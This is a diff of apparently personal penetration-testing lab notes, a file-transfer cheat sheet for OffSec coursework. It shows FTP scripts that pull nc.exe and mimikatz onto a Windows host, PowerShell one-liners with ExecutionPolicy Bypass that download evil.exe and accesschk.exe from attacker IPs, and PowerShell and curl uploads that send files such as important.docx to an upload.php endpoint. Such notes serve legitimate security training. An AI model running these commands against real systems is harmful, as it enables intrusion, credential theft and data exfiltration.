@@ -245,14 +245,16 @@ Setup script
 ```
 kali@kali:~$ cat ./setup-ftp.sh #!/bin/bash
 sudo groupadd ftpgroup
-sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser sudo pure-pw useradd offsec -u ftpuser -d /ftphome sudo pure-pw mkdb
+sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser 
+sudo pure-pw useradd offsec -u ftpuser -d /ftphome 
+sudo pure-pw mkdb
 sudo cd /etc/pure-ftpd/auth/
 sudo ln -s ../conf/PureDB 60pdb
 sudo mkdir -p /ftphome
 sudo chown -R ftpuser:ftpgroup /ftphome/
 sudo systemctl restart pure-ftpd
 ```
-We will make the script executable, then run it and enter “lab” as the password for the offsec user when prompted:
+We will make the script executable, then run it and enter “lab1234” as the password for the offsec user when prompted:
 
 ```
 kali@kali:~$ chmod +x setup-ftp.sh kali@kali:~$ sudo ./setup-ftp.sh Password:
@@ -283,7 +285,7 @@ Create script
 ```
 echo open 10.11.0.4 21> ftp.txt 
 echo USER offsec>> ftp.txt 
-echo lab>> ftp.txt 
+echo lab1234>> ftp.txt 
 echo bin >> ftp.txt 
 echo GET nc.exe >> ftp.txt 
 echo bye >> ftp.txt
@@ -294,7 +296,7 @@ Copy mimikatz files
 ```
 echo open 192.168.119.175 21> ftp.txt
 echo USER offsec>> ftp.txt
-echo lab>> ftp.txt
+echo lab1234>> ftp.txt
 echo bin >> ftp.txt
 echo GET mimikatz.exe >> ftp.txt
 echo GET mimilib.dll >> ftp.txt
@@ -366,6 +368,10 @@ Powershell one liner
 
 ```
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.175/accesschk.exe', 'C:\tmp\accesschk.exe')"
+
+
 ```
 
 On Kali
@@ -440,8 +446,9 @@ Upload file
 ```
  C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
 ```
+Upload File On Linux using curl
 
-
+`curl -F 'file=@/var/tmp/out.txt' http://192.168.119.175/upload.php`
 
 https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/
 
